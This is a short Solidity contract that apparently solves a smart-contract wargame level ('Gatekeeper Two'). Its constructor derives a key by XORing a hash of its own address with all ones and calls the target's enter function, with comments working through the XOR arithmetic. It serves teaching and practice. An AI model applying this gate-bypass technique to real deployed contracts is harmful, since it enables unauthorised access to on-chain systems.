// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatePasserTwo{
    // ^ bitwise operator (XOR) means 0 if bits are the same, 1 if different.
        // 8 byte   > 0xdCaFC94638fe7B17
        // KEY      > 0x235036B9C70184E8 (mask to get 0xFFFFFFFFFFFFFFFF)
        // gate 3 - 0xFFFFFFFFFFFFFFFF == (0xdCaFC94638fe7B17 ^ 0x235036B9C70184E8 = 0xFFFFFFFFFFFFFFFF)
    constructor(address gate) public {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0)-1));
        address(gate).call(abi.encodeWithSignature("enter(bytes8)",key));   
    }
}

//0x235036B9C70184E8, 0x31ADe2E08048182f1D049f04462eD184a2bff3B3
//0x0000000000000000